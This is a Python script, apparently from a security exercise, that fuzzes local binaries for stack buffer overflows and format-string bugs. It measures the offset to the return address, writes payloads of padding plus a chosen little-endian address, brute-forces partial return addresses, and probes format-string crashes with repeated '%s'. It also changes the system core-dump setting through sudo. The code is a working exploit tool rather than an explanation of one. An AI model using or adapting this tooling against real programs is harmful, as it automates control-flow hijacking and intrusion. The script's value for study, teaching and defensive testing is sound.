# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from struct import pack
import subprocess
import resource
from numpy import little_endian
import pexpect
from fuzzingbook.Fuzzer import RandomFuzzer
import os
import sys
import subprocess
from fuzzingbook.GrammarCoverageFuzzer import GrammarCoverageFuzzer
from fuzzingbook.Grammars import Grammar, EXPR_GRAMMAR, CGI_GRAMMAR, START_SYMBOL, URL_GRAMMAR
from fuzzingbook.MutationFuzzer import MutationFuzzer
from fuzzingbook.SearchBasedFuzzer import mutate
from pwn import *
from pwnlib import *


def cmd_line_call(name, args):
    child = pexpect.spawn(name, [args])
    # Wait for the end of the output
    child.expect(pexpect.EOF)
    out = child.before  # we get all the data before the EOF (stderr and stdout)
    child.close()  # that will set the return code for us
    # signalstatus and existstatus read as the same (for my purpose only)
    if child.exitstatus is None:
        returncode = child.signalstatus
    else:
        returncode = child.exitstatus
    return (out, returncode)


def findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations, inputFromFile=True):
    f = RandomFuzzer()

    inp = seedInput
    minBadLen = sys.maxsize
    lenToReachReturnAddr = sys.maxsize
    inp = ""
    broken=0
    if inputFromFile:
        for i in range(1,mutations):
            # inp = mutate(inp)
            inp = inp + 'A'
            currLen = len(inp)
            # create files and keep feeding them into the system
            inputFromFile = open(fuzzFile, 'wb')
            inputFromFile.write(currLen.to_bytes(4, 'big'))
            inputFromFile.write(bytes(inp, 'utf-8'))
            inputFromFile.close()
            try:
                output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                print(output.stdout)
                print(output.stderr)
            except subprocess.CalledProcessError:
                if broken==0:
                    minBadLen = currLen
                    broken=1
                print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
                faultAddr=sigFaultAddr()    
                if faultAddr== '0x41414141':
                    lenToReachReturnAddr=currLen-4
                    break
    else:
        for i in range(mutations):
            inp = inp + 'A'
            currLen = len(inp)
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                print(output.stdout)
                print(output.stderr)
            except subprocess.CalledProcessError:
                if broken==0:
                    minBadLen = currLen
                    broken=1
                print(i, f"crushed the system with inp={repr(inp)} and len=", currLen)
                faultAddr=sigFaultAddr()    
                if faultAddr== '0x41414141':
                    lenToReachReturnAddr=currLen-4
                    break
    print(f"The minimum bad len input that was found is {minBadLen}")
    return lenToReachReturnAddr


def test():
    l="%08x"
    print(len(l))


def attackSystem(lenToReachReturnAddr, fuzzedProgram, fuzzFile, attackAddress,inputFromFile=True):
    if lenToReachReturnAddr==sys.maxsize:
        print("System was not broken due to lack of mutations or segmentation fault not occuring")
        return 0
    if inputFromFile:
        inputFromFile = open(fuzzFile, 'wb')
        attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
        attackString = b'A' * lenToReachReturnAddr + attackAddress
        inputFromFile.write(attackLen)
        inputFromFile.write(attackString)
        inputFromFile.close()
        print("NOW WE ATTACK")
        print("This is our weapon ", fuzzFile)
        print(attackLen)
        print(attackString)
        output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
        print(output)
        print("Return code=", returncode)
    else:
        inp=lenToReachReturnAddr*b"A"
        inp=inp+attackAddress
        attackLen=(lenToReachReturnAddr + 4)
        print("NOW WE ATTACK")
        print("This is our weapon ", inp)
        subprocess.call([fuzzedProgram,inp])
        
    return attackLen


def breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile, inputFromFile=True):
    # +4 to overwrite the return address
    inp = b'A' * (lenToReachReturnAddr + 4)
    i=1
    gb=10_000_000_000
    faultAddr='0x41414141'
    if inputFromFile:
        while i<gb and faultAddr== '0x41414141':
            inp = inp + i*b'A'
            currLen = lenToReachReturnAddr+4+i
            # create files and keep feeding them into the system
            file = open(fuzzFile, 'wb')
            file.write(currLen.to_bytes(4, 'big'))
            file.write(inp)
            file.close()
            output, returncode = cmd_line_call(fuzzedProgram, fuzzFile)
            print(output)
            print(returncode)
            print("Len=", currLen)
            print("Si_addr=", sigFaultAddr())
            i=i*10
            faultAddr=sigFaultAddr()
    else:
        while i<gb and faultAddr== '0x41414141':
            inp = inp + i*b'A'
            currLen = lenToReachReturnAddr+4+i
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                print(output)
            except subprocess.CalledProcessError:
                print("Len=", currLen)
                print("Si_addr=", sigFaultAddr())
            except OSError:
                break
            i=i*10
            faultAddr=sigFaultAddr()
    if i>=gb:
        print("The attack file can be at least 1 GB in size")
    else:
        print(f"The attack file size can be at least {int(i/10)} bytes in size")

#Make the address big endian
#returns a normal view of the address into a string form
def convertAddressToString(addr):
    addr=str(addr)
    aux=addr.replace("\\x",'')
    aux=aux.replace("b'",'')
    aux=aux.replace('\'','')
    flipBytes=""
    i=1
    auxc=''
    for c in reversed(aux):
        if i%2==1:
            auxc=c
        else:
            flipBytes=flipBytes+c+auxc
        i=i+1
    return flipBytes


# partial address must contain full bytes
def attackWithPartialAddress(lenToReachReturnAddr, partialAddress, fuzzedProgram, fuzzFile, inputFromFile):

    # build the address
    partialAddressLen = len(str(partialAddress))
    unknownBytesNr = 4 - partialAddressLen
    possibleAddresses= pow(256,unknownBytesNr)
    validAddresses=[b'0']
    if inputFromFile :
        for i in range(possibleAddresses.__round__()):
            file = open(fuzzFile, 'wb')
            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress.encode(encoding="latin")
            # build the attack
            attackLen = (lenToReachReturnAddr + 4).to_bytes(4, 'big')
            inp = b'A' * lenToReachReturnAddr
            file.write(attackLen)
            file.write(inp)
            file.write(attackAddress)
            file.close()
            print("NOW WE ATTACK")
            print("This is our weapon ", fuzzFile)
            print(inp)
            print(attackAddress)
            try:
                output = subprocess.run([fuzzedProgram, fuzzFile], capture_output=True, text=True, shell=False, check=True, errors='ignore')
            except subprocess.CalledProcessError:
                faultAddr=sigFaultAddr().replace("0x",'')
                myaddr=convertAddressToString(attackAddress)
                if faultAddr!='0' and faultAddr!=myaddr:
                    #execution got deflected to a valid address
                    validAddresses.append(attackAddress)
                else:
                    print("Not a valid address", attackAddress)
    else:
        for i in range(1,possibleAddresses):
            attackAddress = i.to_bytes(unknownBytesNr, 'big') + partialAddress.encode(encoding="latin")
            inp = b'A' * lenToReachReturnAddr
            inp=inp+ attackAddress
            print("NOW WE ATTACK")
            print(inp)
            print(attackAddress)
            try:
                output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, check=True, errors='ignore')
                print(output)
            except subprocess.CalledProcessError:
                faultAddr=sigFaultAddr().replace("0x",'')
                myaddr=convertAddressToString(attackAddress)
                if faultAddr!='0' and faultAddr!=myaddr:
                    #execution got deflected to a valid address
                    validAddresses.append(attackAddress)
                else:
                    print("Not a valid address", attackAddress)
            except ValueError:
                print("Address contains null bytes",attackAddress)
    validAddresses.remove(b'0')
    print("All the valid addresses that deflect the program:")
    print(validAddresses)
    print("A total of ",len(validAddresses))
    
 #Extract the fault_addr value with the help of the core file 
def sigFaultAddr():

    c = Corefile('./core')
    return hex(c.fault_addr)

#Check for format string
def checkForFormatString(fuzzedProgram,formatParameter):
    inp="FUZZ"+formatParameter
    try:
        output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
        print(output.stdout)
        if formatParameter in output.stdout:
            print("The program has no format string")
            return False
    except subprocess.CalledProcessError:
        print("There is a format string")
    return True


#How many characters could the input buffer take
def maxLengthOfTheFormatString(fuzzedProgram):
    inp="A"
    i=1
    gb=10_000_000_000
    while i<gb:
        inp='A'*i
        try:
            subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
        except subprocess.CalledProcessError:
            break
        except OSError:
                break
        i=i*10
    print(f"The attack file size can be at least {int(i/10)} characters in size")
    return i


def howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen):
    inp="FUZZ"
    for i in range (1,mutations):
        inp=inp+formatParameter
        output = subprocess.run([fuzzedProgram, inp], capture_output=True, text=True, shell=False, errors='ignore')
        print(output.stdout)
        if output.returncode==-11:
            # it must be i/len(formatParameter) since "%" and "s" whould count as two different characters
            if int(i/len(formatParameter))< maxLen:
                print("The program contains the format string vulnerabilty")
                print(f"The program crashes with a string containing {i} \"{formatParameter}\"")
                return i
            else:
                print("The program crashed from diffrent reasons other than format string")
                return 0
    return 0


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    #Set the core file limit and path
    resource.setrlimit(
    resource.RLIMIT_CORE,
    (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
    stream = os.popen('echo Returned output')
    output = stream.read()
    if output != "kernel.core_pattern = core":
        os.system("sudo sysctl kernel.core_pattern=core")
    #////////////////////////////////
    
    #Set variables for the fuzzed program
    seedInput = "abcdefghijklmno"
    fuzzFile = 'attack.bin'
    fuzzedProgram = "./format-string/format1"
    attackAddress=0x80491f6
    littleEndian=p32(attackAddress, endian='little')
    mutations = 2208
    inputFromFile=False
    sys.stdout = open('log.txt', 'w')
    checkForBufferOverflow=False
    
    if(checkForBufferOverflow):
        lenToReachReturnAddr = findMinBadLen(seedInput, fuzzFile, fuzzedProgram, mutations,inputFromFile)
        attackSystem(lenToReachReturnAddr,fuzzedProgram,fuzzFile,littleEndian,inputFromFile)
        attackWithPartialAddress(lenToReachReturnAddr,'\x91\x04\x08', fuzzedProgram,fuzzFile,inputFromFile)
        breakSystemBeforeReturn(lenToReachReturnAddr, fuzzedProgram, fuzzFile, inputFromFile)
    else:
        formatParameter="%s"
        print(checkForFormatString(fuzzedProgram,formatParameter))
        maxLen=maxLengthOfTheFormatString(fuzzedProgram)
        howManyFormatParameters(fuzzedProgram,formatParameter,mutations,maxLen)  
    sys.stdout.close()



